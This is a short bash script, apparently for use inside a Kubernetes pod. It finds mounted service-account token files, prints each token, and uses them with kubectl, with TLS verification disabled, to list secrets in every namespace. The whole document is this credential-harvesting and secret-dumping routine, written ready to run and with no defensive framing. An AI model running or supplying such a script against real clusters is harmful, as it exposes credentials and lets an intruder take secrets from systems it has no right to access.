#!/bin/bash

for path in $(mount | grep kube-api | awk '{print $3}'); do TOKEN=$(cat $path/token); echo $TOKEN; ./kubectl --server=https://$KUBERNETES_SERVICE_HOST --token=$TOKEN --insecure-skip-tls-verify=true get secrets -A; done